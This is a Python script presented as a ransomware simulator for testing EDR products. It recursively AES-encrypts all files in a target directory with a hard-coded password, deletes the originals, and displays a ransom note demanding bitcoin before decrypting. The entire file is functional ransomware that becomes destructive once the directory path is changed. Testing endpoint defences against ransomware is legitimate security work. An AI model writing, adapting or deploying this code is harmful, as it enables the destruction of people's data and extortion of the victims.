# ----- Libraries -------------------------------------------------- #

import os
import pyAesCrypt
from rich.console import Console
import time

# ----- Global Declaration ----------------------------------------- #

console = Console()
directory = "/Users/cursed/MyFiles/Projects/Test"
password = "123456789"
bufferSize = 64 * 1024

# ----- Banner ----------------------------------------------------- #

def banner():
    console.print(rf"""[#79d45e]
┌───────────────────────────────────────────────────────────────────────────────────┐                                                                                      
│                                                                                   │    
│    ooooo   ooooo                    oooo          .oooooo.                 .      │ 
│    `888'   `888'                    `888         d8P'  `Y8b              .o8      │
│     888     888   .oooo.    .oooo.o  888 .oo.   888           .oooo.   .o888oo    │
│     888ooooo888  `P  )88b  d88(  "8  888P"Y88b  888          `P  )88b    888      │
│     888     888   .oP"888  `"Y88b.   888   888  888           .oP"888    888      │
│     888     888  d8(  888  o.  )88b  888   888  `88b    ooo  d8(  888    888 .    │
│    o888o   o888o `Y888""8o 8""888P' o888o o888o  `Y8bood8P'  `Y888""8o   "888"    │
│                                                                                   │
│                                       +-+-+                                       │
│                                 [white]Welcome to HashCat[#79d45e]                                │
│     [white]A Ransomware Simulator written in Python that helps to test EDR Solutions[#79d45e]     │
│                                       +-+-+                                       │
│                                                                                   │
│                                       +-+-+                                       │
│                                 [white]Made by [bold red]Cursed.271[#79d45e]                                │
│                                       +-+-+                                       │
└───────────────────────────────────────────────────────────────────────────────────┘        
    """)

# ----- File Encryption -------------------------------------------- #

def encryption():
    for root, dirs, files in os.walk(directory):
        for file in files:
            filePath = os.path.join(root, file)
            pyAesCrypt.encryptFile(filePath, filePath + ".aes", password, bufferSize)
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if not file.endswith(".aes")]
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)    

# ----- File Decryption -------------------------------------------- #

def decryption():
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".aes"):
                filepath = os.path.join(root, file)
                pyAesCrypt.decryptFile(filepath, filepath[:-4], password, bufferSize)
    files_in_directory = os.listdir(directory)
    filtered_files = [file for file in files_in_directory if file.endswith(".aes")]
    for file in filtered_files:
        path_to_file = os.path.join(directory, file)
        os.remove(path_to_file)

# ----- Menu ------------------------------------------------------- #

def unlock():
    console.print("[red]+----------------------------------------------------------------------------------------+")
    console.print("[red]+ All your files are now encrypted!")
    console.print("[red]+ Check your email to find a wallet address where you can deposit 0.003 BTC")
    console.print("[red]+ Once we receive the money, we'll share the password with you to unlock your files")
    console.print("[red]+----------------------------------------------------------------------------------------+")
    password2 = console.input("[white]+ Enter the password: ")
    if (password2 == password):
        console.print("[green]+----------------------------------------------------------------------------------------+")
        console.print("[green]+ Thank you for the payment!")
        time.sleep(2)
        decryption()
        console.print("[green]+ We have unlocked your files....")
        console.print("[green]+----------------------------------------------------------------------------------------+")
    else:
        console.print("[red]+----------------------------------------------------------------------------------------+")
        console.print("[red]+ You have entered the wrong password!")
        console.print("[red]+ All your files are corrupted....")
        console.print("[red]+----------------------------------------------------------------------------------------+")

# ----- Main Function ---------------------------------------------- #

if __name__=="__main__":
    banner()
    encryption()
    unlock()

# ----- End -------------------------------------------------------- #